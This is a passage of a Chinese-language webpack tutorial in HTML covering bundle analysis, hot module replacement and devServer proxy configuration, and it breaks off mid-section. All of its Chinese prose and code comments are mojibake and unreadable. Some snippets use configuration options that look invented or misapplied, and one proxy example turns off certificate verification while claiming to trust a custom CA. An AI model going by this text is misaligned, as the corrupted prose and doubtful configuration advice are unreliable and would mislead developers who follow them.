JavaScript"><span class="hljs-comment">// å…³è”SourceMapåˆ†ææºç </span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">UnusedFilesPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;unused-files-webpack-plugin&#x27;</span>);<br><br><span class="hljs-attr">plugins</span>: [<br>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnusedFilesPlugin</span>(&#123;<br>    <span class="hljs-attr">patterns</span>: [<span class="hljs-string">&#x27;src/**/*.js&#x27;</span>],<br>    <span class="hljs-attr">globOptions</span>: &#123; <span class="hljs-attr">ignore</span>: <span class="hljs-string">&#x27;node_modules/**&#x27;</span> &#125;<br>  &#125;)<br>]<br></code></pre></td></tr></table></figure><p>(2) ç¬¬ä¸‰æ–¹åº“å æ¯”è®¡ç®—</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç”Ÿæˆnode_moduleså æ¯”æŠ¥å‘Š</span><br><span class="hljs-keyword">const</span> nodeModuleSize = stats.<span class="hljs-property">compilation</span>.<span class="hljs-property">chunks</span>.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">sum, chunk</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">return</span> sum + chunk.<span class="hljs-property">modules</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">m</span> =&gt;</span> m.<span class="hljs-property">name</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;node_modules&#x27;</span>))<br>    .<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">size, m</span>) =&gt;</span> size + m.<span class="hljs-property">size</span>, <span class="hljs-number">0</span>);<br>&#125;, <span class="hljs-number">0</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`node_moduleså æ¯”ï¼š<span class="hljs-subst">$&#123;(nodeModuleSize/stats.compilation.assets[<span class="hljs-string">&#x27;main.js&#x27;</span>].size()*<span class="hljs-number">100</span>).toFixed(<span class="hljs-number">1</span>)&#125;</span>%`</span>);<br></code></pre></td></tr></table></figure><p>(3) Gzipåä½“ç§¯é¢„ä¼°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">new</span> <span class="hljs-title class_">BundleAnalyzerPlugin</span>(&#123;<br>  <span class="hljs-attr">defaultSizes</span>: <span class="hljs-string">&#x27;gzip&#x27;</span>, <span class="hljs-comment">// æ˜¾ç¤ºgzipåä½“ç§¯</span><br>  <span class="hljs-attr">analyzerStatsOptions</span>: &#123;<br>    <span class="hljs-comment">// è‡ªå®šä¹‰å‹ç¼©é…ç½®</span><br>    <span class="hljs-attr">gzipLevel</span>: <span class="hljs-number">9</span>,<br>    <span class="hljs-attr">brotli</span>: <span class="hljs-literal">true</span><br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p><strong>é¿å‘æŒ‡å—</strong></p><p>(1) åˆ†æç»“æœå¤±çœŸ</p><ul><li>ç¡®ä¿ä½¿ç”¨productionæ¨¡å¼åˆ†æï¼ˆmode: â€˜productionâ€™ï¼‰</li><li>ç¦ç”¨devtoolæˆ–è®¾ä¸ºhidden-source-map</li></ul><p>(2) å†…å­˜æº¢å‡ºå¤„ç†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å¢åŠ Nodeå†…å­˜é™åˆ¶</span><br>node --max-old-space-size=4096 node_modules/webpack/bin/webpack.js<br></code></pre></td></tr></table></figure><p>(3) å®‰å…¨é£é™©é˜²èŒƒ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç”Ÿäº§ç¯å¢ƒè‡ªåŠ¨ç¦ç”¨</span><br><span class="hljs-attr">plugins</span>: [<br>  process.<span class="hljs-property">env</span>.<span class="hljs-property">ANALYZE</span> ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">BundleAnalyzerPlugin</span>() : <span class="hljs-literal">false</span><br>].<span class="hljs-title function_">filter</span>(<span class="hljs-title class_">Boolean</span>)<br></code></pre></td></tr></table></figure><h2 id="5-2-DevServeræ·±åº¦é…ç½®"><a href="#5-2-DevServeræ·±åº¦é…ç½®" class="headerlink" title="5.2 DevServeræ·±åº¦é…ç½®"></a>5.2 DevServeræ·±åº¦é…ç½®</h2><h3 id="5-2-1-HMRåŸç†ä¸çƒ­æ›´æ–°èŒƒå›´æ§åˆ¶"><a href="#5-2-1-HMRåŸç†ä¸çƒ­æ›´æ–°èŒƒå›´æ§åˆ¶" class="headerlink" title="5.2.1 HMRåŸç†ä¸çƒ­æ›´æ–°èŒƒå›´æ§åˆ¶"></a>5.2.1 HMRåŸç†ä¸çƒ­æ›´æ–°èŒƒå›´æ§åˆ¶</h3><p><strong>HMR æ ¸å¿ƒå·¥ä½œæµç¨‹</strong></p><pre class="mermaid">sequenceDiagram  Browser->>Webpack DevServer: 1. å»ºç«‹ WebSocket è¿æ¥  Webpack DevServer->>Browser: 2. æ¨é€å½“å‰ç¼–è¯‘å“ˆå¸Œ  Note left of Webpack DevServer: æ–‡ä»¶ä¿®æ”¹  Webpack DevServer->>Compiler: 3. è§¦å‘å¢é‡ç¼–è¯‘  Compiler->>Webpack DevServer: 4. å‘é€æ›´æ–°ä¿¡å·(hash-update)  Webpack DevServer->>Browser: 5. é€šè¿‡ WS å‘é€æ›´æ–°æ¸…å•  Browser->>Webpack Runtime: 6. å‘èµ· JSONP è¯·æ±‚è·å–æ›´æ–°æ¨¡å—  Webpack Runtime->>Browser: 7. æ‰§è¡Œæ¨¡å—æ›¿æ¢  Browser->>HMR API: 8. è§¦å‘ module.hot.accept</pre><p><strong>åº•å±‚å®ç°åŸç†</strong></p><p>(1) å…³é”®æ¨¡å—åä½œ</p><table><thead><tr><th align="left">æ¨¡å—</th><th align="left">èŒè´£</th></tr></thead><tbody><tr><td align="left">Webpack DevServer</td><td align="left">æä¾› HTTP æœåŠ¡ + WebSocket é€šä¿¡</td></tr><tr><td align="left">HotModuleReplacementPlugin</td><td align="left">åœ¨è¾“å‡ºä»£ç ä¸­æ³¨å…¥ HMR Runtime å’Œæ¨¡å—æ›´æ–°é€»è¾‘</td></tr><tr><td align="left">HMR Runtime (å®¢æˆ·ç«¯)</td><td align="left">å¤„ç†æ›´æ–°æ¶ˆæ¯ã€åŠ è½½æ–°æ¨¡å—ã€æ‰§è¡Œçƒ­æ›¿æ¢</td></tr><tr><td align="left">webpack&#x2F;hot&#x2F;emitter</td><td align="left">æœåŠ¡ç«¯äº‹ä»¶å¹¿æ’­æœºåˆ¶</td></tr></tbody></table><p>(2) æ›´æ–°åŒ…ç»“æ„è§£æ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å®¢æˆ·ç«¯æ¥æ”¶çš„æ›´æ–°åŒ…</span><br>&#123;<br>  <span class="hljs-string">&quot;c&quot;</span>: &#123; <span class="hljs-comment">// æ›´æ–°çš„ chunk ID</span><br>    <span class="hljs-string">&quot;main&quot;</span>: [ <span class="hljs-comment">// æ›´æ–°çš„æ¨¡å—æ•°ç»„</span><br>      [moduleId, <span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable language_">module</span></span>) &#123; <span class="hljs-comment">/* æ–°æ¨¡å—å·¥å‚å‡½æ•° */</span> &#125;]<br>    ]<br>  &#125;,<br>  <span class="hljs-string">&quot;r&quot;</span>: [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>] <span class="hljs-comment">// éœ€è¦é‡æ–°åŠ è½½çš„ chunk</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>çƒ­æ›´æ–°èŒƒå›´æ§åˆ¶ç­–ç•¥</strong></p><p>(1) æ¨¡å—çº§ç²’åº¦æ§åˆ¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åªç›‘æ§ç‰¹å®šæ¨¡å—æ›´æ–°</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">module</span>.<span class="hljs-property">hot</span>) &#123;<br>  <span class="hljs-comment">// ç²¾ç¡®ç›‘å¬ç»„ä»¶</span><br>  <span class="hljs-variable language_">module</span>.<span class="hljs-property">hot</span>.<span class="hljs-title function_">accept</span>(<br>    [<span class="hljs-string">&#x27;./components/Button.jsx&#x27;</span>, <span class="hljs-string">&#x27;./utils/api.js&#x27;</span>], <br>    <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-comment">// æ‰‹åŠ¨æ›´æ–°é€»è¾‘</span><br>      <span class="hljs-keyword">const</span> <span class="hljs-title class_">NewButton</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./components/Button.jsx&#x27;</span>).<span class="hljs-property">default</span>;<br>      <span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">render</span>(<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">NewButton</span> /&gt;</span></span>, buttonContainer);<br>    &#125;<br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) çŠ¶æ€ä¿ç•™æŠ€æœ¯</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// React ç»„ä»¶çŠ¶æ€ä¿ç•™</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">module</span>.<span class="hljs-property">hot</span>) &#123;<br>  <span class="hljs-variable language_">module</span>.<span class="hljs-property">hot</span>.<span class="hljs-title function_">accept</span>(<span class="hljs-string">&#x27;./App.jsx&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// è·å–å½“å‰ç»„ä»¶çŠ¶æ€</span><br>    <span class="hljs-keyword">const</span> currentState = store.<span class="hljs-title function_">getState</span>();<br>    <br>    <span class="hljs-comment">// é‡æ–°æ¸²æŸ“</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-title class_">NextApp</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./App.jsx&#x27;</span>).<span class="hljs-property">default</span>;<br>    <span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">render</span>(<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Provider</span> <span class="hljs-attr">store</span>=<span class="hljs-string">&#123;store&#125;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">NextApp</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Provider</span>&gt;</span></span>,<br>      rootEl<br>    );<br>    <br>    <span class="hljs-comment">// æ¢å¤çŠ¶æ€</span><br>    store.<span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;HMR_RELOAD&#x27;</span>, <span class="hljs-attr">payload</span>: currentState &#125;);<br>  &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>(3) æ›´æ–°è¾¹ç•Œæ§åˆ¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è®¾ç½®æ›´æ–°è¾¹ç•Œï¼ˆCSSæ¨¡å—æ— éœ€å¤„ç†ï¼‰</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">hot</span>.<span class="hljs-title function_">accept</span>([<span class="hljs-string">&#x27;./styles.css&#x27;</span>], <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-comment">// CSS æ›´æ–°è‡ªåŠ¨åº”ç”¨ï¼Œæ— éœ€æ“ä½œ</span><br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½ä¼˜åŒ–å®è·µ</strong></p><p>(1) å¤§å‹åº”ç”¨æ›´æ–°åŠ é€Ÿ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é…ç½® webpack.config.js</span><br><span class="hljs-attr">devServer</span>: &#123;<br>  <span class="hljs-attr">hot</span>: <span class="hljs-literal">true</span>,<br>  <span class="hljs-attr">devMiddleware</span>: &#123;<br>    <span class="hljs-attr">writeToDisk</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// ç¦æ­¢å†™å…¥ç£ç›˜</span><br>    <span class="hljs-attr">serverSideRender</span>: <span class="hljs-literal">true</span> <span class="hljs-comment">// æœåŠ¡ç«¯æ¸²æŸ“ä¼˜åŒ–</span><br>  &#125;,<br>  <span class="hljs-attr">client</span>: &#123;<br>    <span class="hljs-attr">overlay</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// å…³é—­é”™è¯¯é®ç½©</span><br>    <span class="hljs-attr">progress</span>: <span class="hljs-literal">false</span> <span class="hljs-comment">// å…³é—­è¿›åº¦æ¡</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) æ›´æ–°é¢‘ç‡èŠ‚æµ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è‡ªå®šä¹‰ä¸­é—´ä»¶</span><br>devServer.<span class="hljs-property">setupMiddlewares</span> = <span class="hljs-function">(<span class="hljs-params">middlewares</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> throttle = <span class="hljs-title function_">createThrottle</span>(<span class="hljs-number">1000</span>); <span class="hljs-comment">// 1ç§’èŠ‚æµ</span><br>  <br>  <span class="hljs-keyword">return</span> [<br>    ...middlewares,<br>    <span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (req.<span class="hljs-property">url</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;__webpack_hmr&#x27;</span>)) &#123;<br>        <span class="hljs-title function_">throttle</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">next</span>());<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_">next</span>();<br>      &#125;<br>    &#125;<br>  ];<br>&#125;;<br></code></pre></td></tr></table></figure><p>(3) é€‰æ‹©æ€§ HMR æ³¨å…¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åªå¯¹å¼€å‘ç¯å¢ƒå…³é”®æ¨¡å—å¯ç”¨</span><br><span class="hljs-keyword">new</span> webpack.<span class="hljs-title class_">HotModuleReplacementPlugin</span>(&#123;<br>  <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.(jsx|tsx|vue)$/</span> <span class="hljs-comment">// ä»… JSX/TSX/Vue æ–‡ä»¶å¯ç”¨</span><br>&#125;)<br><br><span class="hljs-comment">// é˜»æ­¢å†’æ³¡æ›´æ–°</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">hot</span>.<span class="hljs-title function_">decline</span>([<span class="hljs-string">&#x27;./config.js&#x27;</span>]); <span class="hljs-comment">// æ­¤æ¨¡å—å˜æ›´æ—¶å¼ºåˆ¶åˆ·æ–°</span><br></code></pre></td></tr></table></figure><p><strong>é¢è¯•æ·±åº¦é—®é¢˜</strong></p><p>(1) HMR å¦‚ä½•ä¿ç•™ React ç»„ä»¶çš„çŠ¶æ€ï¼Ÿ</p><p>é€šè¿‡ react-refresh çš„ runtime æ³¨å…¥ï¼Œåœ¨ç»„ä»¶æ›´æ–°æ—¶ï¼š</p><ul><li>åˆ›å»ºä»£ç†ç»„ä»¶ä¿ç•™çŠ¶æ€æ ‘</li><li>æ˜ å°„æ–°æ—§ç»„ä»¶å…³ç³»</li><li>è§¦å‘ç”Ÿå‘½å‘¨æœŸé’©å­ï¼ˆå¦‚ useEffect æ¸…ç†ï¼‰</li></ul><p>(2) WebSocket æ–­å¼€åå¦‚ä½•æ¢å¤ HMRï¼Ÿ</p><p>æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è‡ªåŠ¨é‡è¿æœºåˆ¶</span><br><span class="hljs-keyword">const</span> socket = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(url);<br>socket.<span class="hljs-property">onclose</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">setTimeout</span>(initSocket, <span class="hljs-number">1000</span>);<br><span class="hljs-comment">// è¶…æ—¶æ£€æµ‹</span><br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123; <br>  <span class="hljs-keyword">if</span> (socket.<span class="hljs-property">readyState</span> &gt; <span class="hljs-number">1</span>) <span class="hljs-title function_">initSocket</span>(); <br>&#125;, <span class="hljs-number">5000</span>);<br></code></pre></td></tr></table></figure><p>(3) å¦‚ä½•å®ç° Vuex store çš„çƒ­æ›´æ–°ï¼Ÿ</p><p>ä»£ç å®ç°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">module</span>.<span class="hljs-property">hot</span>) &#123;<br>  <span class="hljs-variable language_">module</span>.<span class="hljs-property">hot</span>.<span class="hljs-title function_">accept</span>(<span class="hljs-string">&#x27;./store&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> newStore = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./store&#x27;</span>).<span class="hljs-property">default</span>;<br>    store.<span class="hljs-title function_">hotUpdate</span>(&#123;<br>      <span class="hljs-attr">modules</span>: newStore.<span class="hljs-property">modules</span><br>    &#125;);<br>  &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-2-2-Proxyé…ç½®è§£å†³è·¨åŸŸï¼ˆpathRewrite-contextï¼‰"><a href="#5-2-2-Proxyé…ç½®è§£å†³è·¨åŸŸï¼ˆpathRewrite-contextï¼‰" class="headerlink" title="5.2.2 Proxyé…ç½®è§£å†³è·¨åŸŸï¼ˆpathRewrite&#x2F;contextï¼‰"></a>5.2.2 Proxyé…ç½®è§£å†³è·¨åŸŸï¼ˆ<code>pathRewrite</code>&#x2F;<code>context</code>ï¼‰</h3><p><strong>è·¨åŸŸé—®é¢˜æœ¬è´¨ä¸è§£å†³æ–¹æ¡ˆå¯¹æ¯”</strong></p><pre class="mermaid">graph LR  A[æµè§ˆå™¨] -->|åŒæºç­–ç•¥| B[APIè¯·æ±‚è¢«æ‹¦æˆª]  B --> C[è§£å†³æ–¹æ¡ˆ]  C --> D1[åç«¯CORS]  C --> D2[JSONP]  C --> D3[ä»£ç†è½¬å‘]  D3 --> E[Webpack DevServer Proxy]</pre><p>ä»£ç†æ–¹æ¡ˆä¼˜åŠ¿ï¼š</p><ul><li>å‰ç«¯é›¶æ”¹é€ </li><li>æ”¯æŒHTTPS&#x2F;WebSocket</li><li>è·¯å¾„é‡å†™&#x2F;è¯·æ±‚æ‹¦æˆª</li></ul><p><strong>æ ¸å¿ƒé…ç½®å‚æ•°è§£æ</strong></p><p>(1) åŸºç¡€ä»£ç†è®¾ç½®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-attr">devServer</span>: &#123;<br>  <span class="hljs-attr">proxy</span>: &#123;<br>    <span class="hljs-string">&#x27;/api&#x27;</span>: &#123;<br>      <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;http://api.example.com&#x27;</span>,<br>      <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,<br>      <span class="hljs-attr">pathRewrite</span>: &#123; <span class="hljs-string">&#x27;^/api&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span> &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) å…³é”®å‚æ•°è¯¦è§£</p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">ç±»å‹</th><th align="left">ä½œç”¨</th><th align="left">é»˜è®¤å€¼</th></tr></thead><tbody><tr><td align="left">target</td><td align="left">string</td><td align="left">ä»£ç†ç›®æ ‡æœåŠ¡å™¨åœ°å€</td><td align="left">-</td></tr><tr><td align="left">changeOrigin</td><td align="left">boolean</td><td align="left">ä¿®æ”¹è¯·æ±‚å¤´Hostä¸ºç›®æ ‡åŸŸå</td><td align="left">false</td></tr><tr><td align="left">pathRewrite</td><td align="left">object</td><td align="left">URLè·¯å¾„é‡å†™è§„åˆ™</td><td align="left">-</td></tr><tr><td align="left">context</td><td align="left">string[]</td><td align="left">åŒ¹é…å¤šä¸ªè·¯å¾„å‰ç¼€</td><td align="left">-</td></tr><tr><td align="left">secure</td><td align="left">boolean</td><td align="left">æ˜¯å¦éªŒè¯SSLè¯ä¹¦</td><td align="left">true</td></tr><tr><td align="left">ws</td><td align="left">boolean</td><td align="left">æ˜¯å¦ä»£ç†WebSocket</td><td align="left">true</td></tr><tr><td align="left">headers</td><td align="left">object</td><td align="left">æ·»åŠ è‡ªå®šä¹‰è¯·æ±‚å¤´</td><td align="left">-</td></tr></tbody></table><p><strong>é«˜çº§ä»£ç†ç­–ç•¥å®æˆ˜</strong></p><p>(1) å¤šè·¯å¾„ä¸Šä¸‹æ–‡ä»£ç†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŒ¹é…å¤šä¸ªå‰ç¼€</span><br><span class="hljs-attr">proxy</span>: [&#123;<br>  <span class="hljs-attr">context</span>: [<span class="hljs-string">&#x27;/auth&#x27;</span>, <span class="hljs-string">&#x27;/users&#x27;</span>],<br>  <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;http://user-service.com&#x27;</span>,<br>  <span class="hljs-attr">pathRewrite</span>: &#123; <span class="hljs-string">&#x27;^/auth&#x27;</span>: <span class="hljs-string">&#x27;/api/v1/auth&#x27;</span>, <span class="hljs-string">&#x27;^/users&#x27;</span>: <span class="hljs-string">&#x27;/api/v1/users&#x27;</span> &#125;<br>&#125;]<br></code></pre></td></tr></table></figure><p>(2) åŠ¨æ€ç›®æ ‡è½¬å‘</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ ¹æ®è¯·æ±‚åŠ¨æ€é€‰æ‹©ç›®æ ‡</span><br><span class="hljs-attr">proxy</span>: &#123;<br>  <span class="hljs-string">&#x27;/services&#x27;</span>: &#123;<br>    <span class="hljs-attr">target</span>: <span class="hljs-function">(<span class="hljs-params">req</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">const</span> service = req.<span class="hljs-property">headers</span>[<span class="hljs-string">&#x27;x-service-name&#x27;</span>];<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">`http://<span class="hljs-subst">$&#123;service&#125;</span>.internal.com`</span>;<br>    &#125;,<br>    <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(3) è¯·æ±‚æ‹¦æˆªä¸ä¿®æ”¹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">proxy</span>: &#123;<br>  <span class="hljs-string">&#x27;/api&#x27;</span>: &#123;<br>    <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;http://api.example.com&#x27;</span>,<br>    <span class="hljs-attr">bypass</span>: <span class="hljs-function">(<span class="hljs-params">req, res, proxyOptions</span>) =&gt;</span> &#123;<br>      <span class="hljs-comment">// æ‹¦æˆªç‰¹å®šè¯·æ±‚</span><br>      <span class="hljs-keyword">if</span> (req.<span class="hljs-property">path</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;/test&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;/mock/test.json&#x27;</span>; <span class="hljs-comment">// è¿”å›æœ¬åœ°mockæ•°æ®</span><br>      &#125;<br>      <span class="hljs-comment">// æ·»åŠ è®¤è¯å¤´</span><br>      req.<span class="hljs-property">headers</span>[<span class="hljs-string">&#x27;Authorization&#x27;</span>] = <span class="hljs-string">&#x27;Bearer token&#x27;</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(4) HTTPSè¯ä¹¦ä»£ç†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-attr">proxy</span>: &#123;<br>  <span class="hljs-string">&#x27;/secure&#x27;</span>: &#123;<br>    <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;https://secure-api.com&#x27;</span>,<br>    <span class="hljs-attr">secure</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// ç¦ç”¨è¯ä¹¦éªŒè¯</span><br>    <span class="hljs-attr">agent</span>: <span class="hljs-keyword">new</span> https.<span class="hljs-title class_">Agent</span>(&#123;<br>      <span class="hljs-attr">ca</span>: fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;internal-ca.pem&#x27;</span>) <span class="hljs-comment">// è‡ªç­¾åè¯ä¹¦</span><br>    &#125;)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å®‰å…¨é˜²æŠ¤ç­–ç•¥</strong></p><p>(1) è¯·æ±‚å¤´è¿‡æ»¤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 